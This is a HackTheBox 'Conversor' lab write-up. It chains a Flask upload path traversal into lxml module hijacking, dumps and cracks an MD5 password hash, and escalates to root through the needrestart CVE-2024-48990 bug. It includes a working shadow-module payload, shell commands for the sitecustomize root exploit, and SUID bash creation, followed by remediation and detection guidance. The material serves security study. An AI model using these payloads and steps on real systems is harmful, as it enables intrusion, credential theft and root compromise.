---
layout: default
title: "HackTheBox - Conversor"
---

# HackTheBox - Conversor

**OS:** Linux (Ubuntu 22.04)

Conversor is an Easy Linux machine running a Flask-based XML/XSLT converter web application whose source is publicly downloadable. Two chained vulnerabilities in the `/convert` route -- an unsanitized upload filename passed directly to `os.path.join()` and a lazy lxml import that defers module loading to request handlers rather than module startup -- allow writing a shadow `lxml.py` into the application root and executing it inside fresh Apache prefork workers. The shadow module reads a SQLite database whose passwords are stored as raw MD5, yielding a credential that cracks with rockyou to give SSH access as `fismathack`. That account holds a `NOPASSWD` sudo entry for `needrestart` 3.7, which is vulnerable to CVE-2024-48990: it reads `PYTHONPATH` from a target process's `/proc/<pid>/environ` and passes it to a root-owned Python interpreter, causing `sitecustomize.py` to execute as root and producing a SUID bash copy.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (conversor.htb) |
| Initial Access | Path traversal + lxml module hijacking (www-data) |
| Privilege Escalation | MD5 hash crack -> SSH (fismathack) -> sudo needrestart CVE-2024-48990 (root) |
| Final Access | `root` |

---

## Recon

### Port Scan

p0rtix returned two open services.

| Port | Protocol | Service | Version |
|------|----------|---------|---------|
| 22 | TCP | SSH | OpenSSH 8.9 |
| 80 | TCP | HTTP | Apache 2.4 / Flask (conversor.htb) |

The virtual host `conversor.htb` was added to `/etc/hosts`. Browsing port 80 revealed a registration and login flow fronting an XML/XSLT converter.

### Source Code Review

The application exposes its full source at `/static/source_code.tar.gz`. Reading `app.py` revealed two composable vulnerabilities in the `/convert` route.

**Vulnerability 1 -- path traversal in file upload**

The route saves the XSLT upload using the raw client-supplied filename:

```python
save_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
xslt_file.save(save_path)
```

A filename of `../lxml.py` causes `os.path.join()` to resolve outside the uploads directory, writing to `/var/www/conversor.htb/lxml.py`. `werkzeug.utils.secure_filename()` is never called.

**Vulnerability 2 -- lazy lxml import in request handler**

The `from lxml import etree` import sits inside `convert()`, outside any try/except block:

```python
def convert():
    # ... files saved to disk above this line ...
    from lxml import etree     # outside try/except; executes on every fresh worker
    try:
        ...
    except Exception:
        ...
```

Apache prefork workers that have not yet served a `/convert` request have not cached lxml. When one of those workers receives a request, Python resolves the import at runtime by scanning `sys.path`, which starts with the application root (`/var/www/conversor.htb/`).

Together: write a shadow `lxml.py` via path traversal, flood requests to trigger fresh workers, and the shadow code executes as `www-data`.

---

## Initial Access

### lxml Module Hijacking (www-data)

**Step 1: Register and authenticate**

```
POST /register   username=attacker  password=attacker
POST /login      username=attacker  password=attacker
```

Capture the session cookie returned by `/login` for use in all subsequent requests.

**Step 2: Write shadow lxml.py via path traversal**

POST to `/convert` with `xslt_file.filename` set to `../lxml.py`. The application writes the file to `/var/www/conversor.htb/lxml.py` and returns HTTP 200 -- XSLT parsing fails because the payload is not a valid stylesheet, but the write completes successfully.

The shadow payload restores the real lxml immediately (so future XSLT transforms succeed), then reads the SQLite database via the stdlib `sqlite3` module and writes findings to the publicly served static directory:

```python
import sys as _sys, os as _os, re as _re

# restore real lxml so future XSLT transforms still work
_sys.modules.pop('lxml', None)
_sys.modules.pop('lxml.etree', None)
_d = '/var/www/conversor.htb'
if _d in _sys.path:
    _sys.path.remove(_d)
try:
    import lxml as _lxml
    import lxml.etree as _letree
    _sys.modules['lxml'] = _lxml
    _sys.modules['lxml.etree'] = _letree
except Exception:
    pass
if _d not in _sys.path:
    _sys.path.insert(0, _d)

import subprocess as _sp, sqlite3 as _sq3, re as _re

_out = []

def _run(cmd):
    try:
        r = _sp.run(['/bin/bash', '-c', cmd], capture_output=True, text=True, timeout=10)
        return r.stdout + r.stderr
    except Exception as e:
        return f'FAIL:{e}'

# read app.py to discover DB path
_apppy = _run('cat /var/www/conversor.htb/app.py')
_db_path = '/var/www/conversor.htb/instance/users.db'   # extracted from app.py

# dump users table via stdlib sqlite3
_con = _sq3.connect(_db_path)
_cur = _con.cursor()
_cur.execute('SELECT * FROM users')
_rows = _cur.fetchall()
_con.close()

# enumerate privesc vectors
_out += [_run('id'), _run('cat /etc/crontab'), _run('sudo -l 2>&1')]

with open('/var/www/conversor.htb/static/enum.txt', 'w') as _f:
    _f.write(repr(_rows) + '\n'.join(_out))
```

> **Why this works:** `os.path.join(UPLOAD_FOLDER, '../lxml.py')` resolves to the parent directory because Python's `os.path.join()` treats `..` as a literal path component and does not strip it -- it is a filesystem join, not a security primitive. `werkzeug.utils.secure_filename()` strips path separators and leading dots from client-supplied names and would have prevented this write entirely; the application omits that call.

**Step 3: Trigger the import with concurrent requests**

Send 40+ simultaneous POST requests to `/convert`. Fresh Apache prefork workers -- those that have not yet handled a `/convert` request -- have an empty `sys.modules` cache. When they receive the request, Python resolves `from lxml import etree` by scanning `sys.path`; `/var/www/conversor.htb` appears first, so the shadow `lxml.py` is imported instead of the system package.

> **Why this works:** Python's import system caches modules in `sys.modules` per-process. A prefork worker spawned after the shadow file was written has no cached `lxml` entry. The import in `convert()` runs before the try/except that wraps XSLT parsing, so the shadow code executes even though the request ultimately returns a parse error. Flooding with parallel requests maximises the chance of hitting workers that have not yet imported lxml.

**Step 4: Read the output**

Fetching `/static/enum.txt` (Flask auto-serves the `static/` directory) returns:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)

=== sqlite3 DB dump ===
Tables: ['users', 'sqlite_sequence', 'files']
--- users (id,username,password) ---
(1, 'fismathack', '5b5c3ac3a1c897c94caad48e6c71fdec')

=== cron ===
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

Key findings: the `users` table stores `fismathack`'s password as a raw MD5 hash; a cron job runs `*.py` files in the scripts directory every minute as `www-data`. The `sudo -l` output (also in `enum.txt`) shows `fismathack` holds NOPASSWD sudo rights over `needrestart`.

---

## Privilege Escalation

### fismathack -- MD5 Hash Crack

`app.py` stores passwords as unsalted MD5 digests. The DB dump yields `fismathack`'s hash: `5b5c3ac3a1c897c94caad48e6c71fdec`.

```
$ echo '5b5c3ac3a1c897c94caad48e6c71fdec' > hash.txt
$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
Ke**************   (fismathack)
1g 0:00:00:01 DONE
```

> **Why this works:** Raw MD5 without a salt is a direct lookup against any precomputed wordlist. There is no per-credential cost, so cracking completes in under two seconds against rockyou.

SSH as `fismathack` and collect the user flag:

```
$ ssh fismathack@<target-ip>

fismathack@conversor:~$ cat user.txt
<user-flag-redacted>
```

### root -- needrestart CVE-2024-48990

```
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=...

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

needrestart 3.7 is vulnerable to **CVE-2024-48990**. When needrestart checks a Python process for outdated shared libraries, it reads `PYTHONPATH` from the process's `/proc/<pid>/environ` and passes it to a freshly forked Python interpreter running as root. Python's startup sequence unconditionally imports `sitecustomize.py` from every directory in `sys.path` -- including any path injected via `PYTHONPATH` -- before any user code runs.

**Trigger condition:** needrestart only calls `files()` (the vulnerable code path) for processes using shared libraries that were modified after the process started. Loading a fake `.so` and then `touch`ing it satisfies this condition on demand.

**Exploit sequence:**

```bash
# 1. Create malicious sitecustomize.py
fismathack@conversor:~$ mkdir /tmp/evil
fismathack@conversor:~$ cat > /tmp/evil/sitecustomize.py << 'EOF'
import os
uid = os.getuid()
if uid == 0:
    os.system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash")
EOF

# 2. Create a Python script that loads a fake shared library
fismathack@conversor:~$ cat > /tmp/sleep2.py << 'EOF'
import ctypes, time
ctypes.CDLL("/tmp/evil/libfake.so")
time.sleep(600)
EOF

# 3. Start background Python with PYTHONPATH set
# (script-file argument -- needrestart skips processes launched with python3 -c)
fismathack@conversor:~$ PYTHONPATH=/tmp/evil python3 /tmp/sleep2.py &

# 4. Touch libfake.so AFTER the process starts to make it "newer"
# -- needrestart sees an outdated library and enters the files() check
fismathack@conversor:~$ touch /tmp/evil/libfake.so

# 5. sudo needrestart: finds the Python process, reads PYTHONPATH=/tmp/evil from
# /proc/<pid>/environ, forks python3 as root, which imports sitecustomize.py
fismathack@conversor:~$ sudo /usr/sbin/needrestart
```

needrestart identifies and processes the background Python process:

```
[Core] #2601 is a NeedRestart::Interp::Python
[Python] #2601: source=/tmp/sleep2.py
```

`sitecustomize.py` runs as root, writing a SUID copy of `/bin/bash`:

```
fismathack@conversor:~$ /tmp/rootbash -p -c "id"
uid=1000(fismathack) gid=1000(fismathack) euid=0(root) groups=1000(fismathack)

fismathack@conversor:~$ /tmp/rootbash -p -c "cat /root/root.txt"
<root-flag-redacted>
```

> **Why this works:** needrestart calls `files()` only when a process's loaded shared libraries have been modified after process start -- a dynamic check, not a static snapshot. Touching `libfake.so` after launching the background Python job makes the library appear newer than the process, forcing needrestart into the affected code path. Once there, it reads the process environment from `/proc/<pid>/environ` and passes `PYTHONPATH` to a root-owned Python invocation without sanitization. Python's startup sequence imports `sitecustomize.py` from every directory in `sys.path` unconditionally, before any user code runs -- making this a reliable arbitrary-code-execution primitive as root regardless of what the forked script does.

---

## Root Cause

1. **Unsanitized file-upload path** -- `app.py` passes client-supplied filenames directly to `os.path.join()` without calling `werkzeug.utils.secure_filename()`, enabling `../` traversal to write files outside the uploads directory.
2. **Lazy lxml import** -- `from lxml import etree` is placed inside `convert()` and outside any try/except, so fresh Apache prefork workers resolve the import against `sys.path` on their first request rather than against a pre-populated module cache set at startup.
3. **Raw MD5 password hashing** -- `app.py` stores passwords as unsalted MD5 digests, trivially reversed with a standard wordlist.
4. **needrestart 3.7 CVE-2024-48990** -- needrestart propagates `PYTHONPATH` from target process environments to a root-owned Python interpreter without validation; `sitecustomize.py` in that path executes at interpreter startup as root.

## Impact

Full compromise of the web application and host OS. An unauthenticated attacker who can reach port 80 can achieve code execution as `www-data`, recover stored credentials, escalate to a local user, and obtain a root shell with read/write access to every file on the system.

## Remediation

**1. Apply `secure_filename()` to all uploaded filenames (highest priority).**
Replace `os.path.join(UPLOAD_FOLDER, xslt_file.filename)` with `os.path.join(UPLOAD_FOLDER, werkzeug.utils.secure_filename(xslt_file.filename))`. This strips path separators and dotfiles from client-supplied names and eliminates the traversal entirely.

**2. Move the lxml import to module level.**
Place `from lxml import etree` at the top of `app.py`, outside any function. Module-level imports are cached in `sys.modules` at worker startup; no fresh worker can import a shadow module because the real lxml is already present before the first request is served.

**3. Replace raw MD5 with a modern password hashing algorithm.**
Use `bcrypt` or `argon2-cffi`. Both incorporate per-password salts and a tunable cost factor that makes offline cracking infeasible. Migrate existing MD5 hashes by re-hashing on next successful login.

**4. Upgrade needrestart to 3.8+ (patches CVE-2024-48990 through CVE-2024-48993).**
The fix removes the `PYTHONPATH`-propagation code path. If an upgrade is not immediately possible, remove the `NOPASSWD` sudo entry for `needrestart`; the vulnerability requires a user who can run needrestart without a password prompt.

**5. Audit and restrict sudo NOPASSWD entries.**
Review `/etc/sudoers` for NOPASSWD grants to unprivileged users and remove any that are not operationally required.

### Validation

- Confirm path traversal is closed: POST a filename of `../lxml.py` to `/convert` and verify the file is written only within the uploads directory.
- Confirm the module-level import fix: start a fresh worker and verify `sys.modules['lxml']` is populated before the first `/convert` request arrives.
- Register a new user and confirm the stored credential is a bcrypt or Argon2 digest, not an MD5 hash.
- Run `needrestart --version` and confirm 3.8+, or verify the NOPASSWD entry for `needrestart` has been removed.

## Detection Opportunities

- **Path traversal upload:** Web server access logs will show POST requests to `/convert` with a `Content-Disposition` filename containing `../`. A WAF or application-layer rule parsing multipart field names would catch this at request time.
- **Unexpected Python file in web root:** File integrity monitoring (auditd `inotify` or similar) on `/var/www/conversor.htb/` alerting on new `.py` files created outside the uploads subdirectory would surface the shadow module write.
- **Shadow module import:** An auditd `openat` rule on `/var/www/conversor.htb/lxml.py` for `python3` worker processes would catch the import at execution time, before any payload runs.
- **SQLite database access by www-data:** Auditd `open` rules on `instance/users.db` for processes not owned by the application owner would surface unexpected DB reads from a compromised worker.
- **needrestart PYTHONPATH injection (CVE-2024-48990):** Monitor for `sudo` executions of `/usr/sbin/needrestart` by non-root users (Linux audit `execve` with non-root `ruid`), and for `python3` processes with `euid=0` forked by `needrestart` that load modules from user-writable paths.

## Lessons Learned

- Apache prefork creates a module-import window: fresh workers have empty `sys.modules` caches. A path-traversal write can shadow any module in the application's working directory if imports are deferred to request handlers rather than placed at module level. The fix is two characters: move the import.
- `os.path.join()` does not sanitize `..` components -- it is a path join, not a security primitive. `werkzeug.utils.secure_filename()` exists precisely to close this class of upload vulnerability and must be applied to every client-supplied filename before it touches the filesystem.
- Python's interpreter startup unconditionally imports `sitecustomize.py` from every directory in `sys.path` before any user code runs, including inside sudo-spawned subprocesses. Any tool that propagates user-controlled environment variables to a root-owned interpreter inherits this risk.
- "Outdated library" is not a static property of a running process -- touching a `.so` file after a process starts is sufficient to trigger needrestart's `files()` check, making the exploit timing window predictable and reproducible.

---

## Cleanup

- Removed `/tmp/rootbash`, `/tmp/evil/`, `/tmp/sleep2.py`, and any `/tmp/sc_*.txt` files from the target.
- Shadow `lxml.py` removed from `/var/www/conversor.htb/lxml.py`; `enum.txt` removed from `/var/www/conversor.htb/static/enum.txt`.
- No persistent listeners left running on the attack box or target.
- HTB flags submitted; machine stopped (`htb stop`).
